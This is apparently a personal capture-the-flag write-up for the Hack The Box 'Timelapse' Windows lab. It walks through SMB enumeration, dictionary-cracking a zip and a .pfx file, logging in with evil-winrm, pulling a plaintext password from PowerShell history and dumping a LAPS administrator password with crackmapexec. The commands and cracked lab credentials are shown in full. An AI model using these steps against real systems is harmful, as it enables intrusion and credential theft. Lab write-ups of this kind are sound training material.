# Timelapse - Windows Box

**Reconnaissance**

-  `sudo nmap -sC -sV -oN nmap -v -p- 10.10.11.152

-`-sC` for default scripts (does some shit)
-`sV` enumerate service versions
-`-p-`all ports

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509213919.png)

We see an Active Directory listing using LDAP (service associated with Active Directory).

-`DNS Port 53`
-`Kerberos Port 88`
-`MSRPC Port 135`
-`Netbios Port 139`
-`LDAP Port 389`

LDAP server has a hostname of timelapse.htb0

- Kerberos, netbios, and DNS being used within the Active Directory machine.

**Enumerating available shares from the timelapse box**

- `enum4linux timelapse.htb` to find available shares 

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509221643.png)

From this, we get 'Known Usernames' which is somewhat interesting.

- We also get the domain name TIMELAPSE and domain SID.
**Connecting using smbclient**

`smbclient -L //10.10.11.152/ -U ''`
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509215543.png)

You can see we have all these possible shares (sharenames) to connect to within the Active Directory machine.

We can check connection to these shares like: 

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509220120.png)

Eventually we are able to connect to `IPC$`:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509220143.png)

**Pentesting SMB**

Use https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb HackTricks to guide pentesting methodology of smb
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509223236.png)




- Now that we know a little more about exploit smb shares, lets come back to the `smbclient` command, this time not providing for any password.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509223017.png)

Poggers, using the smbclient command with a blank password and a username of `guest` allows us to connect, from which we can see two shares Dev and HelpDesk.


I then navigated to these directories and got everything from them using the `get` command; we find a zip `winrm_backup.zip` that may be crackable.

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509223510.png)

- On the contrary, we find a lot of shit in the `\HelpDesk` share (`LAPS.x64.msi, LAPS_Datasheet.docx, LAPS_OperationsGuide.docx, LAPS_TechnicalSpecification.docx`) that might be useful later.

- First of all, this tells us that the environment is using LAPS, which can be abused to receive a local administrator password. It randomizes local administrator passwords across many domain computers, but is still abusable.

- You can read more about LAPS here: https://www.hackingarticles.in/credential-dumpinglaps/

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20230204161703.png)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509223602.png)

Sick, we have the `winrm_backup.zip` archive on our host kali machine now after `getting` it through `smbclient`--now we need to find out how to crack the zip, which has a password.

For this, i have chosen to use a tool called `fcrackzip` on kali: https://www.geeksforgeeks.org/fcrackzip-tool-crack-a-zip-file-password-in-kali-linux/ (open google search provides this)

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509224436.png)

- Check the link above to review fcrackzip functionality, but in short:
	- `-b` allows bruteforcing of the zip file
	- `-c` is used to describe the dictionary (the password cracking bank) character set (standard 'a1')
	- `-D` allows reading of passwords from a provided file; executes a dictionary attack basically.

- So, we craft the command `fcrackzip winrm_backup.zip -D -p /usr/share/wordlists/rockyou.txt -u`

Using the dictionary `-D` argument, found the password to be *supremelegacy*

- Dope, but IDK what a .pfx file is so lets look this up.
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20230204130824.png)

Google leads us to believe this file will likely contain an SSL cert and public key.

**Extracting certificate and public key from encrypted .pfx file**

IBM:https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509225426.png)

The above screenshot tells us that when the pfx file was created, an import password was used to create it combining the certificate and key using openssl, as above.

- Knowing this, we need to extract the certificate and private key so that it can be later used to establish some sort of connection to the box.
	- `openssl pkcs12 -in [pfxfilename.pfx] -nocerts -out [key.key]` for Extraction of **Private Key**
	- `openssl pkcs12 -in [pfxfilename.pfx] -clcerts -nokeys -out [certname.crt]`

- Can we crack the password that was used to encrypt the .pfx file?

Yes, I decided to...

**Using crackpkcs12 to crack passwords from pfx files** 

- compiled it using libssl-dev.

- Used dictionary option to test rockyou.txt wordlist against .pfx file

`crackpkcs12 -d /usr/share/wordlists/rockyou.txt ../legacyy_dev_auth.pfx`

- ![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509232401.png)

The tool works successfully, and returns the password **thuglegacy**

*Don't ask me why I used crackpkcs12, I don't remember.* 

Now we can run the openssl commands that I posted above with the import password to get the private key and certificate from the .pfx file:

`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out keyout`

- Prompts us to enter import password, which we found to be `thuglegacy`.

**Here is the private key value**:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509232654.png)

**Extracting the Certificate from the pfx file**

`openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certout`

- Worked, here is the certificate value:

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509232907.png)

---------

Now we have a private key and certificate, so it's time to attempt connection to the box with some kind of tool.

**Using evil-winrm to connect using private key and certificate**

- After a lot of googling, I decided to try to use `Evil-WinRM`. https://github.com/Hackplayers/evil-winrm

- EvilWinRM allows exploitation of *Windows Remote Management* 

**Usage**: `evil-winrm -i [IP] -u [USER] [-P PORT] [-p PASS] [-c PUBLIC_KEY_CERT_PATH] [-k PRIVATE_KEY_PATH]`

- Thus far, we know that we have been able to enumerate:
	- A username of `guest`
	- A pkcs12 password of `thuglegacy`
	- IP address of box is `10.10.11.152`
	- Extracted Certificate named `certout`
	-  Extracted Private key named `keyout`
	- Port 5986 (WSmans) is using SSL

- Using these parameters, we craft the following command:
	- `evil-winrm -c certout -S -k keyout -i 10.10.11.152 -u guest -p thuglegacy`
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220509234831.png)

We are able to connect using the private key and certificate we gained from the .pfx file.

- Once we're on it, we can start navigating and enumerating everything:

   - `user.txt: 130c1c0f9a2a39552c8a2338604db563`

   - `user.txt: 52a1ac599a8c4965339e9d824ab7c1c1`

Now that we got the `user flags`, we need to focus on privesc to get the `system flag`.


**Privilege escalating using the system flag**

- I have looked through powershell history on the machine to find the following commands being saved in history:
```whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

The text `E3R$Q62^12p7PLlC%KWaxuaV` is being made into a secure string; leads us to believe this is the password ($p) trying to be applied.

- We can see the environment variables $p (password) and $c (credentials) being created, in which $c is taking arguments of 'svc_deploy' (presumably username) and $p (password).

**Used crackmapexec to connect to domain name controller, and make it leak laps**

- Attempted to connect through smb and ldap: `crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost timelapse.htb -M laps`

	- We use the `--kdcHost` switch to indicate a kerberos domain controller host is attempted connection.
	- `-M` switch is used to specify the module that we will use with crackmap, which in this case is LAPS (Local Administrator Password Solution).
	- LAPS is a windows feature that automatically manages and backs up the password of a local admin account.

- ![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220511010731.png)

- Needed to configure default DNS resolution for 10.10.11.152 to timelapse.htb in /etc/hosts
-----
**Got local admin password from crackmapexec, now we need to escalate privileges and log into the administrator account** 

Got onto the machine with admin privileges using evilrm and the new password:


![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220511011900.png)

in which i then used Powershell to find the root.txt flag
![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220511011727.png)

- Powershell used: `get-ChildItem -Recurse -Filter 'root.txt'`

![](https://cdn.ethereal.bond/file/github-images/Pasted+image+20220511011951.png)

System Flag: `0b68d020c694289c7601b752ef7a1e0d`

